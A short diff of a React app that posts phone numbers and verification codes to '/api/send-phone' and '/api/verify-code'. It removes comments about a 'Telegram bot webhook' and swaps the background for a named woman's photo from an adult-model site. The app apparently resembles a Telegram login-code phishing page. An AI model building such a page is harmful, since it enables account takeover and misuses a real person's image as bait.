@@ -26,7 +26,6 @@ function App() {
     setLoading(true);
     
     try {
-      // Replace this URL with your actual Telegram bot webhook endpoint
       const response = await fetch('/api/send-phone', {
         method: 'POST',
         headers: {
@@ -55,7 +54,6 @@ function App() {
     setLoading(true);
     
     try {
-      // Replace this URL with your actual Telegram bot webhook endpoint
       const response = await fetch('/api/verify-code', {
         method: 'POST',
         headers: {
@@ -95,7 +93,7 @@ function App() {
     <div 
       className="min-h-screen bg-cover bg-center bg-fixed relative"
       style={{
-        backgroundImage: 'url("https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg?auto=compress&cs=tinysrgb&w=1920&h=1080&fit=crop")'
+        backgroundImage: 'url("https://www.babepedia.com/pics/Danielle%20Sellers.jpg")'
       }}
     >
       {/* Dark overlay for better text readability */}
